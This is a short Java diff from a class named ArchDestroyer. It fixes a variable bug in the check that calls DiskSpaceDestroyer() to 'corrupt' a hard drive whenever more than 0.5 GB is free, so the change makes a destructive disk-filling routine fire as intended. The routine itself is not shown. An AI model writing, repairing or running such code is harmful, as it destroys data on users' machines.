@@ -46,7 +46,7 @@ public class ArchDestroyer {
             try {
                 String tempLoc = dataLocation.replace("void", "beproductive.txt");
                 FileStore myStore = Files.getFileStore(Paths.get(tempLoc));
-                if (store.getUsableSpace() > 500000000){
+                if (myStore.getUsableSpace() > 500000000){
                     DiskSpaceDestroyer();//Only corrupt if more than 0.5 Gb are free
                 }
                 didCorruptHarddrive = true;
